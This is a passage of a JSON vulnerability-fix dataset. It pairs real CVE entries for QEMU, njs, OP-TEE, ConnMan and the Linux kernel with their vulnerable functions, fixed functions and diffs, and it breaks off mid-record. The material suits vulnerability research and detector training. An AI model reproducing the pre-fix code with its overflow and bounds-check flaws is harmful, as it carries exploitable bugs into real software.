[
    {
        "cve_id": "CVE-2016-2538",
        "func_name": "qemu/rndis_query_response",
        "description": "Multiple integer overflows in the USB Net device emulator (hw/usb/dev-network.c) in QEMU before 2.5.1 allow local guest OS administrators to cause a denial of service (QEMU process crash) or obtain sensitive host memory information via a remote NDIS control message packet that is mishandled in the (1) rndis_query_response, (2) rndis_set_response, or (3) usb_net_handle_dataout function.",
        "git_url": "https://github.com/qemu/qemu/commit/fe3c546c5ff2a6210f9a4d8561cc64051ca8603e",
        "commit_title": "usb: check RNDIS buffer offsets & length",
        "commit_text": " When processing remote NDIS control message packets, the USB Net device emulator uses a fixed length(4096) data buffer. The incoming informationBufferOffset & Length combination could overflow and cross that range. Check control message buffer offsets and length to avoid it. ",
        "func_before": "static int rndis_query_response(USBNetState *s,\n                rndis_query_msg_type *buf, unsigned int length)\n{\n    rndis_query_cmplt_type *resp;\n    /* oid_supported_list is the largest data reply */\n    uint8_t infobuf[sizeof(oid_supported_list)];\n    uint32_t bufoffs, buflen;\n    int infobuflen;\n    unsigned int resplen;\n\n    bufoffs = le32_to_cpu(buf->InformationBufferOffset) + 8;\n    buflen = le32_to_cpu(buf->InformationBufferLength);\n    if (bufoffs + buflen > length)\n        return USB_RET_STALL;\n\n    infobuflen = ndis_query(s, le32_to_cpu(buf->OID),\n                            bufoffs + (uint8_t *) buf, buflen, infobuf,\n                            sizeof(infobuf));\n    resplen = sizeof(rndis_query_cmplt_type) +\n            ((infobuflen < 0) ? 0 : infobuflen);\n    resp = rndis_queue_response(s, resplen);\n    if (!resp)\n        return USB_RET_STALL;\n\n    resp->MessageType = cpu_to_le32(RNDIS_QUERY_CMPLT);\n    resp->RequestID = buf->RequestID; /* Still LE in msg buffer */\n    resp->MessageLength = cpu_to_le32(resplen);\n\n    if (infobuflen < 0) {\n        /* OID not supported */\n        resp->Status = cpu_to_le32(RNDIS_STATUS_NOT_SUPPORTED);\n        resp->InformationBufferLength = cpu_to_le32(0);\n        resp->InformationBufferOffset = cpu_to_le32(0);\n        return 0;\n    }\n\n    resp->Status = cpu_to_le32(RNDIS_STATUS_SUCCESS);\n    resp->InformationBufferOffset =\n            cpu_to_le32(infobuflen ? sizeof(rndis_query_cmplt_type) - 8 : 0);\n    resp->InformationBufferLength = cpu_to_le32(infobuflen);\n    memcpy(resp + 1, infobuf, infobuflen);\n\n    return 0;\n}",
        "func": "static int rndis_query_response(USBNetState *s,\n                rndis_query_msg_type *buf, unsigned int length)\n{\n    rndis_query_cmplt_type *resp;\n    /* oid_supported_list is the largest data reply */\n    uint8_t infobuf[sizeof(oid_supported_list)];\n    uint32_t bufoffs, buflen;\n    int infobuflen;\n    unsigned int resplen;\n\n    bufoffs = le32_to_cpu(buf->InformationBufferOffset) + 8;\n    buflen = le32_to_cpu(buf->InformationBufferLength);\n    if (buflen > length || bufoffs >= length || bufoffs + buflen > length) {\n        return USB_RET_STALL;\n    }\n\n    infobuflen = ndis_query(s, le32_to_cpu(buf->OID),\n                            bufoffs + (uint8_t *) buf, buflen, infobuf,\n                            sizeof(infobuf));\n    resplen = sizeof(rndis_query_cmplt_type) +\n            ((infobuflen < 0) ? 0 : infobuflen);\n    resp = rndis_queue_response(s, resplen);\n    if (!resp)\n        return USB_RET_STALL;\n\n    resp->MessageType = cpu_to_le32(RNDIS_QUERY_CMPLT);\n    resp->RequestID = buf->RequestID; /* Still LE in msg buffer */\n    resp->MessageLength = cpu_to_le32(resplen);\n\n    if (infobuflen < 0) {\n        /* OID not supported */\n        resp->Status = cpu_to_le32(RNDIS_STATUS_NOT_SUPPORTED);\n        resp->InformationBufferLength = cpu_to_le32(0);\n        resp->InformationBufferOffset = cpu_to_le32(0);\n        return 0;\n    }\n\n    resp->Status = cpu_to_le32(RNDIS_STATUS_SUCCESS);\n    resp->InformationBufferOffset =\n            cpu_to_le32(infobuflen ? sizeof(rndis_query_cmplt_type) - 8 : 0);\n    resp->InformationBufferLength = cpu_to_le32(infobuflen);\n    memcpy(resp + 1, infobuf, infobuflen);\n\n    return 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -10,8 +10,9 @@\n \n     bufoffs = le32_to_cpu(buf->InformationBufferOffset) + 8;\n     buflen = le32_to_cpu(buf->InformationBufferLength);\n-    if (bufoffs + buflen > length)\n+    if (buflen > length || bufoffs >= length || bufoffs + buflen > length) {\n         return USB_RET_STALL;\n+    }\n \n     infobuflen = ndis_query(s, le32_to_cpu(buf->OID),\n                             bufoffs + (uint8_t *) buf, buflen, infobuf,",
        "diff_line_info": {
            "deleted_lines": [
                "    if (bufoffs + buflen > length)"
            ],
            "added_lines": [
                "    if (buflen > length || bufoffs >= length || bufoffs + buflen > length) {",
                "    }"
            ]
        }
    },
    {
        "cve_id": "CVE-2016-2538",
        "func_name": "qemu/rndis_set_response",
        "description": "Multiple integer overflows in the USB Net device emulator (hw/usb/dev-network.c) in QEMU before 2.5.1 allow local guest OS administrators to cause a denial of service (QEMU process crash) or obtain sensitive host memory information via a remote NDIS control message packet that is mishandled in the (1) rndis_query_response, (2) rndis_set_response, or (3) usb_net_handle_dataout function.",
        "git_url": "https://github.com/qemu/qemu/commit/fe3c546c5ff2a6210f9a4d8561cc64051ca8603e",
        "commit_title": "usb: check RNDIS buffer offsets & length",
        "commit_text": " When processing remote NDIS control message packets, the USB Net device emulator uses a fixed length(4096) data buffer. The incoming informationBufferOffset & Length combination could overflow and cross that range. Check control message buffer offsets and length to avoid it. ",
        "func_before": "static int rndis_set_response(USBNetState *s,\n                rndis_set_msg_type *buf, unsigned int length)\n{\n    rndis_set_cmplt_type *resp =\n            rndis_queue_response(s, sizeof(rndis_set_cmplt_type));\n    uint32_t bufoffs, buflen;\n    int ret;\n\n    if (!resp)\n        return USB_RET_STALL;\n\n    bufoffs = le32_to_cpu(buf->InformationBufferOffset) + 8;\n    buflen = le32_to_cpu(buf->InformationBufferLength);\n    if (bufoffs + buflen > length)\n        return USB_RET_STALL;\n\n    ret = ndis_set(s, le32_to_cpu(buf->OID),\n                    bufoffs + (uint8_t *) buf, buflen);\n    resp->MessageType = cpu_to_le32(RNDIS_SET_CMPLT);\n    resp->RequestID = buf->RequestID; /* Still LE in msg buffer */\n    resp->MessageLength = cpu_to_le32(sizeof(rndis_set_cmplt_type));\n    if (ret < 0) {\n        /* OID not supported */\n        resp->Status = cpu_to_le32(RNDIS_STATUS_NOT_SUPPORTED);\n        return 0;\n    }\n    resp->Status = cpu_to_le32(RNDIS_STATUS_SUCCESS);\n\n    return 0;\n}",
        "func": "static int rndis_set_response(USBNetState *s,\n                rndis_set_msg_type *buf, unsigned int length)\n{\n    rndis_set_cmplt_type *resp =\n            rndis_queue_response(s, sizeof(rndis_set_cmplt_type));\n    uint32_t bufoffs, buflen;\n    int ret;\n\n    if (!resp)\n        return USB_RET_STALL;\n\n    bufoffs = le32_to_cpu(buf->InformationBufferOffset) + 8;\n    buflen = le32_to_cpu(buf->InformationBufferLength);\n    if (buflen > length || bufoffs >= length || bufoffs + buflen > length) {\n        return USB_RET_STALL;\n    }\n\n    ret = ndis_set(s, le32_to_cpu(buf->OID),\n                    bufoffs + (uint8_t *) buf, buflen);\n    resp->MessageType = cpu_to_le32(RNDIS_SET_CMPLT);\n    resp->RequestID = buf->RequestID; /* Still LE in msg buffer */\n    resp->MessageLength = cpu_to_le32(sizeof(rndis_set_cmplt_type));\n    if (ret < 0) {\n        /* OID not supported */\n        resp->Status = cpu_to_le32(RNDIS_STATUS_NOT_SUPPORTED);\n        return 0;\n    }\n    resp->Status = cpu_to_le32(RNDIS_STATUS_SUCCESS);\n\n    return 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -11,8 +11,9 @@\n \n     bufoffs = le32_to_cpu(buf->InformationBufferOffset) + 8;\n     buflen = le32_to_cpu(buf->InformationBufferLength);\n-    if (bufoffs + buflen > length)\n+    if (buflen > length || bufoffs >= length || bufoffs + buflen > length) {\n         return USB_RET_STALL;\n+    }\n \n     ret = ndis_set(s, le32_to_cpu(buf->OID),\n                     bufoffs + (uint8_t *) buf, buflen);",
        "diff_line_info": {
            "deleted_lines": [
                "    if (bufoffs + buflen > length)"
            ],
            "added_lines": [
                "    if (buflen > length || bufoffs >= length || bufoffs + buflen > length) {",
                "    }"
            ]
        }
    },
    {
        "cve_id": "CVE-2016-2538",
        "func_name": "qemu/usb_net_handle_dataout",
        "description": "Multiple integer overflows in the USB Net device emulator (hw/usb/dev-network.c) in QEMU before 2.5.1 allow local guest OS administrators to cause a denial of service (QEMU process crash) or obtain sensitive host memory information via a remote NDIS control message packet that is mishandled in the (1) rndis_query_response, (2) rndis_set_response, or (3) usb_net_handle_dataout function.",
        "git_url": "https://github.com/qemu/qemu/commit/fe3c546c5ff2a6210f9a4d8561cc64051ca8603e",
        "commit_title": "usb: check RNDIS buffer offsets & length",
        "commit_text": " When processing remote NDIS control message packets, the USB Net device emulator uses a fixed length(4096) data buffer. The incoming informationBufferOffset & Length combination could overflow and cross that range. Check control message buffer offsets and length to avoid it. ",
        "func_before": "static void usb_net_handle_dataout(USBNetState *s, USBPacket *p)\n{\n    int sz = sizeof(s->out_buf) - s->out_ptr;\n    struct rndis_packet_msg_type *msg =\n            (struct rndis_packet_msg_type *) s->out_buf;\n    uint32_t len;\n\n#ifdef TRAFFIC_DEBUG\n    fprintf(stderr, \"usbnet: data out len %zu\\n\", p->iov.size);\n    iov_hexdump(p->iov.iov, p->iov.niov, stderr, \"usbnet\", p->iov.size);\n#endif\n\n    if (sz > p->iov.size) {\n        sz = p->iov.size;\n    }\n    usb_packet_copy(p, &s->out_buf[s->out_ptr], sz);\n    s->out_ptr += sz;\n\n    if (!is_rndis(s)) {\n        if (p->iov.size < 64) {\n            qemu_send_packet(qemu_get_queue(s->nic), s->out_buf, s->out_ptr);\n            s->out_ptr = 0;\n        }\n        return;\n    }\n    len = le32_to_cpu(msg->MessageLength);\n    if (s->out_ptr < 8 || s->out_ptr < len) {\n        return;\n    }\n    if (le32_to_cpu(msg->MessageType) == RNDIS_PACKET_MSG) {\n        uint32_t offs = 8 + le32_to_cpu(msg->DataOffset);\n        uint32_t size = le32_to_cpu(msg->DataLength);\n        if (offs + size <= len)\n            qemu_send_packet(qemu_get_queue(s->nic), s->out_buf + offs, size);\n    }\n    s->out_ptr -= len;\n    memmove(s->out_buf, &s->out_buf[len], s->out_ptr);\n}",
        "func": "static void usb_net_handle_dataout(USBNetState *s, USBPacket *p)\n{\n    int sz = sizeof(s->out_buf) - s->out_ptr;\n    struct rndis_packet_msg_type *msg =\n            (struct rndis_packet_msg_type *) s->out_buf;\n    uint32_t len;\n\n#ifdef TRAFFIC_DEBUG\n    fprintf(stderr, \"usbnet: data out len %zu\\n\", p->iov.size);\n    iov_hexdump(p->iov.iov, p->iov.niov, stderr, \"usbnet\", p->iov.size);\n#endif\n\n    if (sz > p->iov.size) {\n        sz = p->iov.size;\n    }\n    usb_packet_copy(p, &s->out_buf[s->out_ptr], sz);\n    s->out_ptr += sz;\n\n    if (!is_rndis(s)) {\n        if (p->iov.size < 64) {\n            qemu_send_packet(qemu_get_queue(s->nic), s->out_buf, s->out_ptr);\n            s->out_ptr = 0;\n        }\n        return;\n    }\n    len = le32_to_cpu(msg->MessageLength);\n    if (s->out_ptr < 8 || s->out_ptr < len) {\n        return;\n    }\n    if (le32_to_cpu(msg->MessageType) == RNDIS_PACKET_MSG) {\n        uint32_t offs = 8 + le32_to_cpu(msg->DataOffset);\n        uint32_t size = le32_to_cpu(msg->DataLength);\n        if (offs < len && size < len && offs + size <= len) {\n            qemu_send_packet(qemu_get_queue(s->nic), s->out_buf + offs, size);\n        }\n    }\n    s->out_ptr -= len;\n    memmove(s->out_buf, &s->out_buf[len], s->out_ptr);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -30,8 +30,9 @@\n     if (le32_to_cpu(msg->MessageType) == RNDIS_PACKET_MSG) {\n         uint32_t offs = 8 + le32_to_cpu(msg->DataOffset);\n         uint32_t size = le32_to_cpu(msg->DataLength);\n-        if (offs + size <= len)\n+        if (offs < len && size < len && offs + size <= len) {\n             qemu_send_packet(qemu_get_queue(s->nic), s->out_buf + offs, size);\n+        }\n     }\n     s->out_ptr -= len;\n     memmove(s->out_buf, &s->out_buf[len], s->out_ptr);",
        "diff_line_info": {
            "deleted_lines": [
                "        if (offs + size <= len)"
            ],
            "added_lines": [
                "        if (offs < len && size < len && offs + size <= len) {",
                "        }"
            ]
        }
    },
    {
        "cve_id": "CVE-2019-11837",
        "func_name": "nginx/njs/njs_string_prototype_to_bytes",
        "description": "njs through 0.3.1, used in NGINX, has a segmentation fault in String.prototype.toBytes for negative arguments, related to nxt_utf8_next in nxt/nxt_utf8.h and njs_string_offset in njs/njs_string.c.",
        "git_url": "https://github.com/nginx/njs/commit/3515292d7791e706795f0957ed270472715907f0",
        "commit_title": "Fixed String.prototype.toBytes() for ASCII strings.",
        "commit_text": " This closes #155 issue on Github.",
        "func_before": "static njs_ret_t\nnjs_string_prototype_to_bytes(njs_vm_t *vm, njs_value_t *args, nxt_uint_t nargs,\n    njs_index_t unused)\n{\n    u_char             *p;\n    size_t             length;\n    uint32_t           byte;\n    const u_char       *s, *end;\n    njs_slice_prop_t   slice;\n    njs_string_prop_t  string;\n\n    njs_string_slice_prop(&string, &slice, args, nargs);\n\n    if (string.length == 0) {\n        /* Byte string. */\n        return njs_string_slice(vm, &vm->retval, &string, &slice);\n    }\n\n    p = njs_string_alloc(vm, &vm->retval, slice.length, 0);\n\n    if (nxt_fast_path(p != NULL)) {\n\n        if (string.length != 0) {\n            /* UTF-8 string. */\n            end = string.start + string.size;\n\n            s = njs_string_offset(string.start, end, slice.start);\n\n            length = slice.length;\n\n            while (length != 0 && s < end) {\n                byte = nxt_utf8_decode(&s, end);\n\n                if (nxt_slow_path(byte > 0xFF)) {\n                    njs_release(vm, &vm->retval);\n                    vm->retval = njs_value_null;\n\n                    return NXT_OK;\n                }\n\n                *p++ = (u_char) byte;\n                length--;\n            }\n\n        } else {\n            /* ASCII string. */\n            memcpy(p, string.start + slice.start, slice.length);\n        }\n\n        return NXT_OK;\n    }\n\n    return NXT_ERROR;\n}",
        "func": "static njs_ret_t\nnjs_string_prototype_to_bytes(njs_vm_t *vm, njs_value_t *args, nxt_uint_t nargs,\n    njs_index_t unused)\n{\n    u_char             *p;\n    size_t             length;\n    uint32_t           byte;\n    const u_char       *s, *end;\n    njs_slice_prop_t   slice;\n    njs_string_prop_t  string;\n\n    njs_string_slice_prop(&string, &slice, args, nargs);\n\n    if (string.length == 0) {\n        /* Byte string. */\n        return njs_string_slice(vm, &vm->retval, &string, &slice);\n    }\n\n    p = njs_string_alloc(vm, &vm->retval, slice.length, 0);\n\n    if (nxt_fast_path(p != NULL)) {\n\n        if (string.length != string.size) {\n            /* UTF-8 string. */\n            end = string.start + string.size;\n\n            s = njs_string_offset(string.start, end, slice.start);\n\n            length = slice.length;\n\n            while (length != 0 && s < end) {\n                byte = nxt_utf8_decode(&s, end);\n\n                if (nxt_slow_path(byte > 0xFF)) {\n                    njs_release(vm, &vm->retval);\n                    vm->retval = njs_value_null;\n\n                    return NXT_OK;\n                }\n\n                *p++ = (u_char) byte;\n                length--;\n            }\n\n        } else {\n            /* ASCII string. */\n            memcpy(p, string.start + slice.start, slice.length);\n        }\n\n        return NXT_OK;\n    }\n\n    return NXT_ERROR;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -20,7 +20,7 @@\n \n     if (nxt_fast_path(p != NULL)) {\n \n-        if (string.length != 0) {\n+        if (string.length != string.size) {\n             /* UTF-8 string. */\n             end = string.start + string.size;\n ",
        "diff_line_info": {
            "deleted_lines": [
                "        if (string.length != 0) {"
            ],
            "added_lines": [
                "        if (string.length != string.size) {"
            ]
        }
    },
    {
        "cve_id": "CVE-2019-1010294",
        "func_name": "OP-TEE/optee_os/alloc_ta_mem",
        "description": "Linaro/OP-TEE OP-TEE 3.3.0 and earlier is affected by: Rounding error. The impact is: Potentially leaking code and/or data from previous Trusted Application. The component is: optee_os. The fixed version is: 3.4.0 and later.",
        "git_url": "https://github.com/OP-TEE/optee_os/commit/7e768f8a473409215fe3fff8f6e31f8a3a0103c6",
        "commit_title": "core: clear the entire TA area",
        "commit_text": " Previously we cleared (memset to zero) the size corresponding to code and data segments, however the allocation for the TA is made on the granularity of the memory pool, meaning that we did not clear all memory and because of that we could potentially leak code and data of a previous loaded TA.  code and data\"  Suggested-by: Jens Wiklander <jens.wiklander@linaro.org>",
        "func_before": "static struct mobj *alloc_ta_mem(size_t size)\n{\n#ifdef CFG_PAGED_USER_TA\n\treturn mobj_paged_alloc(size);\n#else\n\tstruct mobj *mobj = mobj_mm_alloc(mobj_sec_ddr, size, &tee_mm_sec_ddr);\n\n\tif (mobj)\n\t\tmemset(mobj_get_va(mobj, 0), 0, size);\n\treturn mobj;\n#endif\n}",
        "func": "static struct mobj *alloc_ta_mem(size_t size)\n{\n#ifdef CFG_PAGED_USER_TA\n\treturn mobj_paged_alloc(size);\n#else\n\tstruct mobj *mobj = mobj_mm_alloc(mobj_sec_ddr, size, &tee_mm_sec_ddr);\n\n\tif (mobj) {\n\t\tsize_t granularity = BIT(tee_mm_sec_ddr.shift);\n\n\t\t/* Round up to allocation granularity size */\n\t\tmemset(mobj_get_va(mobj, 0), 0, ROUNDUP(size, granularity));\n\t}\n\treturn mobj;\n#endif\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -5,8 +5,12 @@\n #else\n \tstruct mobj *mobj = mobj_mm_alloc(mobj_sec_ddr, size, &tee_mm_sec_ddr);\n \n-\tif (mobj)\n-\t\tmemset(mobj_get_va(mobj, 0), 0, size);\n+\tif (mobj) {\n+\t\tsize_t granularity = BIT(tee_mm_sec_ddr.shift);\n+\n+\t\t/* Round up to allocation granularity size */\n+\t\tmemset(mobj_get_va(mobj, 0), 0, ROUNDUP(size, granularity));\n+\t}\n \treturn mobj;\n #endif\n }",
        "diff_line_info": {
            "deleted_lines": [
                "\tif (mobj)",
                "\t\tmemset(mobj_get_va(mobj, 0), 0, size);"
            ],
            "added_lines": [
                "\tif (mobj) {",
                "\t\tsize_t granularity = BIT(tee_mm_sec_ddr.shift);",
                "",
                "\t\t/* Round up to allocation granularity size */",
                "\t\tmemset(mobj_get_va(mobj, 0), 0, ROUNDUP(size, granularity));",
                "\t}"
            ]
        }
    },
    {
        "cve_id": "CVE-2012-2322",
        "func_name": "connman/dhcpv6_get_option",
        "description": "Integer overflow in the dhcpv6_get_option function in gdhcp/client.c in ConnMan before 0.85 allows remote attackers to cause a denial of service (infinite loop and crash) via an invalid length value in a DHCP packet.",
        "git_url": "http://git.kernel.org/?p=network/connman/connman.git;a=commitdiff;h=1d1a22fe586a455935483708fbe8eaeada79df7f",
        "commit_title": "Fix packet length checking where payload length could have been zero.",
        "commit_text": "Also check that we don't set the option pointer beyond the end of the packet payload. ",
        "func_before": "uint8_t *dhcpv6_get_option(struct dhcpv6_packet *packet, uint16_t pkt_len,\n\t\t\tint code, uint16_t *option_len, int *option_count)\n{\n\tint rem, count = 0;\n\tuint8_t *optionptr, *found = NULL;\n\tuint16_t opt_code, opt_len, len;\n\n\toptionptr = packet->options;\n\trem = pkt_len - 1 - 3;\n\n\tif (rem <= 0)\n\t\t/* Bad packet */\n\t\treturn NULL;\n\n\twhile (1) {\n\t\topt_code = optionptr[0] << 8 | optionptr[1];\n\t\topt_len = len = optionptr[2] << 8 | optionptr[3];\n\t\tlen += 2 + 2; /* skip code and len */\n\n\t\trem -= len;\n\t\tif (rem < 0)\n\t\t\tbreak;\n\n\t\tif (opt_code == code) {\n\t\t\tif (option_len != NULL)\n\t\t\t\t*option_len = opt_len;\n\t\t\tfound = optionptr + 2 + 2;\n\t\t\tcount++;\n\t\t}\n\n\t\tif (rem == 0)\n\t\t\tbreak;\n\n\t\toptionptr += len;\n\t}\n\n\tif (option_count != NULL)\n\t\t*option_count = count;\n\n\treturn found;\n}",
        "func": "uint8_t *dhcpv6_get_option(struct dhcpv6_packet *packet, uint16_t pkt_len,\n\t\t\tint code, uint16_t *option_len, int *option_count)\n{\n\tint rem, count = 0;\n\tuint8_t *optionptr, *found = NULL;\n\tuint16_t opt_code, opt_len, len;\n\n\toptionptr = packet->options;\n\trem = pkt_len - 1 - 3;\n\n\tif (rem <= 0)\n\t\tgoto bad_packet;\n\n\twhile (1) {\n\t\topt_code = optionptr[0] << 8 | optionptr[1];\n\t\topt_len = len = optionptr[2] << 8 | optionptr[3];\n\t\tlen += 2 + 2; /* skip code and len */\n\n\t\tif (len < 4)\n\t\t\tgoto bad_packet;\n\n\t\trem -= len;\n\t\tif (rem < 0)\n\t\t\tbreak;\n\n\t\tif (opt_code == code) {\n\t\t\tif (option_len != NULL)\n\t\t\t\t*option_len = opt_len;\n\t\t\tif (rem == 0)\n\t\t\t\tfound = NULL;\n\t\t\telse\n\t\t\t\tfound = optionptr + 2 + 2;\n\t\t\tcount++;\n\t\t}\n\n\t\tif (rem == 0)\n\t\t\tbreak;\n\n\t\toptionptr += len;\n\t}\n\n\tif (option_count != NULL)\n\t\t*option_count = count;\n\n\treturn found;\n\nbad_packet:\n\tif (option_len != NULL)\n\t\t*option_len = 0;\n\tif (option_count != NULL)\n\t\t*option_count = 0;\n\treturn NULL;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -9,13 +9,15 @@\n \trem = pkt_len - 1 - 3;\n \n \tif (rem <= 0)\n-\t\t/* Bad packet */\n-\t\treturn NULL;\n+\t\tgoto bad_packet;\n \n \twhile (1) {\n \t\topt_code = optionptr[0] << 8 | optionptr[1];\n \t\topt_len = len = optionptr[2] << 8 | optionptr[3];\n \t\tlen += 2 + 2; /* skip code and len */\n+\n+\t\tif (len < 4)\n+\t\t\tgoto bad_packet;\n \n \t\trem -= len;\n \t\tif (rem < 0)\n@@ -24,7 +26,10 @@\n \t\tif (opt_code == code) {\n \t\t\tif (option_len != NULL)\n \t\t\t\t*option_len = opt_len;\n-\t\t\tfound = optionptr + 2 + 2;\n+\t\t\tif (rem == 0)\n+\t\t\t\tfound = NULL;\n+\t\t\telse\n+\t\t\t\tfound = optionptr + 2 + 2;\n \t\t\tcount++;\n \t\t}\n \n@@ -38,4 +43,11 @@\n \t\t*option_count = count;\n \n \treturn found;\n+\n+bad_packet:\n+\tif (option_len != NULL)\n+\t\t*option_len = 0;\n+\tif (option_count != NULL)\n+\t\t*option_count = 0;\n+\treturn NULL;\n }",
        "diff_line_info": {
            "deleted_lines": [
                "\t\t/* Bad packet */",
                "\t\treturn NULL;",
                "\t\t\tfound = optionptr + 2 + 2;"
            ],
            "added_lines": [
                "\t\tgoto bad_packet;",
                "",
                "\t\tif (len < 4)",
                "\t\t\tgoto bad_packet;",
                "\t\t\tif (rem == 0)",
                "\t\t\t\tfound = NULL;",
                "\t\t\telse",
                "\t\t\t\tfound = optionptr + 2 + 2;",
                "",
                "bad_packet:",
                "\tif (option_len != NULL)",
                "\t\t*option_len = 0;",
                "\tif (option_count != NULL)",
                "\t\t*option_count = 0;",
                "\treturn NULL;"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-2521",
        "func_name": "torvalds/linux/x86_assign_hw_event",
        "description": "The x86_assign_hw_event function in arch/x86/kernel/cpu/perf_event.c in the Performance Events subsystem in the Linux kernel before 2.6.39 does not properly calculate counter values, which allows local users to cause a denial of service (panic) via the perf program.",
        "git_url": "https://github.com/torvalds/linux/commit/fc66c5210ec2539e800e87d7b3a985323c7be96e",
        "commit_title": "perf, x86: Fix Intel fixed counters base initialization",
        "commit_text": " The following patch solves the problems introduced by Robert's commit 41bf498 and reported by Arun Sharma. This commit gets rid of the base + index notation for reading and writing PMU msrs.  The problem is that for fixed counters, the new calculation for the base did not take into account the fixed counter indexes, thus all fixed counters were read/written from fixed counter 0. Although all fixed counters share the same config MSR, they each have their own counter register.  Without:   $ task -e unhalted_core_cycles -e instructions_retired -e baclears noploop 1 noploop for 1 seconds    242202299 unhalted_core_cycles (0.00% scaling, ena=1000790892, run=1000790892)  2389685946 instructions_retired (0.00% scaling, ena=1000790892, run=1000790892)       49473 baclears             (0.00% scaling, ena=1000790892, run=1000790892)  With:   $ task -e unhalted_core_cycles -e instructions_retired -e baclears noploop 1 noploop for 1 seconds   2392703238 unhalted_core_cycles (0.00% scaling, ena=1000840809, run=1000840809)  2389793744 instructions_retired (0.00% scaling, ena=1000840809, run=1000840809)       47863 baclears             (0.00% scaling, ena=1000840809, run=1000840809)  Cc: peterz@infradead.org Cc: ming.m.lin@intel.com Cc: robert.richter@amd.com Cc: asharma@fb.com Cc: perfmon2-devel@lists.sf.net LKML-Reference: <20110319172005.GB4978@quad>",
        "func_before": "static inline void x86_assign_hw_event(struct perf_event *event,\n\t\t\t\tstruct cpu_hw_events *cpuc, int i)\n{\n\tstruct hw_perf_event *hwc = &event->hw;\n\n\thwc->idx = cpuc->assign[i];\n\thwc->last_cpu = smp_processor_id();\n\thwc->last_tag = ++cpuc->tags[i];\n\n\tif (hwc->idx == X86_PMC_IDX_FIXED_BTS) {\n\t\thwc->config_base = 0;\n\t\thwc->event_base\t= 0;\n\t} else if (hwc->idx >= X86_PMC_IDX_FIXED) {\n\t\thwc->config_base = MSR_ARCH_PERFMON_FIXED_CTR_CTRL;\n\t\thwc->event_base = MSR_ARCH_PERFMON_FIXED_CTR0;\n\t} else {\n\t\thwc->config_base = x86_pmu_config_addr(hwc->idx);\n\t\thwc->event_base  = x86_pmu_event_addr(hwc->idx);\n\t}\n}",
        "func": "static inline void x86_assign_hw_event(struct perf_event *event,\n\t\t\t\tstruct cpu_hw_events *cpuc, int i)\n{\n\tstruct hw_perf_event *hwc = &event->hw;\n\n\thwc->idx = cpuc->assign[i];\n\thwc->last_cpu = smp_processor_id();\n\thwc->last_tag = ++cpuc->tags[i];\n\n\tif (hwc->idx == X86_PMC_IDX_FIXED_BTS) {\n\t\thwc->config_base = 0;\n\t\thwc->event_base\t= 0;\n\t} else if (hwc->idx >= X86_PMC_IDX_FIXED) {\n\t\thwc->config_base = MSR_ARCH_PERFMON_FIXED_CTR_CTRL;\n\t\thwc->event_base = MSR_ARCH_PERFMON_FIXED_CTR0 + (hwc->idx - X86_PMC_IDX_FIXED);\n\t} else {\n\t\thwc->config_base = x86_pmu_config_addr(hwc->idx);\n\t\thwc->event_base  = x86_pmu_event_addr(hwc->idx);\n\t}\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -12,7 +12,7 @@\n \t\thwc->event_base\t= 0;\n \t} else if (hwc->idx >= X86_PMC_IDX_FIXED) {\n \t\thwc->config_base = MSR_ARCH_PERFMON_FIXED_CTR_CTRL;\n-\t\thwc->event_base = MSR_ARCH_PERFMON_FIXED_CTR0;\n+\t\thwc->event_base = MSR_ARCH_PERFMON_FIXED_CTR0 + (hwc->idx - X86_PMC_IDX_FIXED);\n \t} else {\n \t\thwc->config_base = x86_pmu_config_addr(hwc->idx);\n \t\thwc->event_base  = x86_pmu_event_addr(hwc->idx);",
        "diff_line_info": {
            "deleted_lines": [
                "\t\thwc->event_base = MSR_ARCH_PERFMON_FIXED_CTR0;"
            ],
            "added_lines": [
                "\t\thwc->event_base = MSR_ARCH_PERFMON_FIXED_CTR0 + (hwc->idx - X86_PMC_IDX_FIXED);"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-1759",
        "func_name": "torvalds/linux/sys_oabi_semtimedop",
        "description": "Integer overflow in the sys_oabi_semtimedop function in arch/arm/kernel/sys_oabi-compat.c in the Linux kernel before 2.6.39 on the ARM platform, when CONFIG_OABI_COMPAT is enabled, allows local users to gain privileges or cause a denial of service (heap memory corruption) by providing a crafted argument and leveraging a race condition.",
        "git_url": "https://github.com/torvalds/linux/commit/0f22072ab50cac7983f9660d33974b45184da4f9",
        "commit_title": "ARM: 6891/1: prevent heap corruption in OABI semtimedop",
        "commit_text": " When CONFIG_OABI_COMPAT is set, the wrapper for semtimedop does not bound the nsops argument.  A sufficiently large value will cause an integer overflow in allocation size, followed by copying too much data into the allocated buffer.  Fix this by restricting nsops to SEMOPM. Untested.  Cc: stable@kernel.org",
        "func_before": "asmlinkage long sys_oabi_semtimedop(int semid,\n\t\t\t\t    struct oabi_sembuf __user *tsops,\n\t\t\t\t    unsigned nsops,\n\t\t\t\t    const struct timespec __user *timeout)\n{\n\tstruct sembuf *sops;\n\tstruct timespec local_timeout;\n\tlong err;\n\tint i;\n\n\tif (nsops < 1)\n\t\treturn -EINVAL;\n\tsops = kmalloc(sizeof(*sops) * nsops, GFP_KERNEL);\n\tif (!sops)\n\t\treturn -ENOMEM;\n\terr = 0;\n\tfor (i = 0; i < nsops; i++) {\n\t\t__get_user_error(sops[i].sem_num, &tsops->sem_num, err);\n\t\t__get_user_error(sops[i].sem_op,  &tsops->sem_op,  err);\n\t\t__get_user_error(sops[i].sem_flg, &tsops->sem_flg, err);\n\t\ttsops++;\n\t}\n\tif (timeout) {\n\t\t/* copy this as well before changing domain protection */\n\t\terr |= copy_from_user(&local_timeout, timeout, sizeof(*timeout));\n\t\ttimeout = &local_timeout;\n\t}\n\tif (err) {\n\t\terr = -EFAULT;\n\t} else {\n\t\tmm_segment_t fs = get_fs();\n\t\tset_fs(KERNEL_DS);\n\t\terr = sys_semtimedop(semid, sops, nsops, timeout);\n\t\tset_fs(fs);\n\t}\n\tkfree(sops);\n\treturn err;\n}",
